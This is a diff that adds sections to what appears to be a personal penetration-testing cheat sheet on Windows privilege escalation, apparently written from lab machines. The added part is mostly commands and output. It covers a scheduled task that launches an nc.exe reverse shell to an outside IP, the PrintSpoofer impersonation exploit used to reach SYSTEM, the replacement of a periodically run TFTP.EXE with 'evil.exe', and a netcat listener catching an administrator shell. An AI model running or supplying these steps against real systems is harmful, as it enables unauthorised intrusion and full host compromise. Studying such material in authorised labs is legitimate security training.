@@ -154,3 +154,105 @@ for /L %i in (1,1,255) do @ping -n 1 -w 200 10.5.5.%i > nul && echo 10.5.5.%i is
 #XP
 C:\Documents and Settings\Administrator\Desktop\
 
+#Examples: Priveleges:
+#https://github.com/itm4n/FullPowers
+#From this resource, we find out that when a LOCAL SERVICE or NETWORK SERVICE is configured to run with a restricted set of privileges, permissions can be recovered by creating a scheduled task. 
+
+PS C:\wamp\www>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State   
+============================= ============================== ========
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeCreateGlobalPrivilege       Create global objects          Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+
+-->
+PS C:\wamp\www> $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `"C:\wamp\www\nc.exe 192.168.118.23 4444 -e cmd.exe`""
+-->
+C:\Windows\system32>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                        State   
+============================= ================================== ========
+SeAssignPrimaryTokenPrivilege Replace a process level token      Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process Disabled
+SeSystemtimePrivilege         Change the system time             Disabled
+SeAuditPrivilege              Generate security audits           Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking           Enabled 
+SeCreateGlobalPrivilege       Create global objects              Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set     Disabled
+SeTimeZonePrivilege           Change the time zone               Disabled
+
+C:\Windows\system32>
+
+-->
+C:\wamp\www>PrintSpoofer64.exe -i -c "cmd /c whoami"
+PrintSpoofer64.exe -i -c "cmd /c whoami"
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+nt authority\system
+
+#PRIVE-Escalation with TFTP
+#We notice that the C://Backup/ directory is writeable.
+#According to this text file, TFTP.EXE is run every five minutes
+C:\>icacls Backup
+icacls Backup
+Backup BUILTIN\Users:(OI)(CI)(F)
+       BUILTIN\Administrators:(I)(OI)(CI)(F)
+       NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+       BUILTIN\Users:(I)(OI)(CI)(RX)
+       NT AUTHORITY\Authenticated Users:(I)(M)
+       NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)
+
+Successfully processed 1 files; Failed processing 0 files
+
+C:\>
+
+-->
+C:\>cd Backup && dir
+cd Backup && dir
+ Volume in drive C has no label.
+ Volume Serial Number is 6E11-8C59
+
+ Directory of C:\Backup
+
+06/12/2020  07:45 AM    <DIR>          .
+06/12/2020  07:45 AM    <DIR>          ..
+06/12/2020  07:45 AM            11,304 backup.txt
+06/12/2020  07:45 AM                73 info.txt
+06/12/2020  07:45 AM            26,112 TFTP.EXE
+               3 File(s)         37,489 bytes
+               2 Dir(s)  28,603,658,240 bytes free
+
+C:\Backup>type info.txt
+type info.txt
+Run every 5 minutes:
+C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt
+C:\Backup>
+
+-->
+C:\Backup>move evil.exe TFTP.EXE
+move evil.exe TFTP.EXE
+        1 file(s) moved.
+
+-->
+┌──(kali㉿kali)-[~]
+└─$ sudo nc -lvvvp 3306                                                              
+listening on [any] 3306 ...
+192.168.68.53: inverse host lookup failed: Host name lookup failure
+connect to [192.168.49.68] from (UNKNOWN) [192.168.68.53] 49729
+Microsoft Windows [Version 10.0.18363.900]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+slort\administrator
+
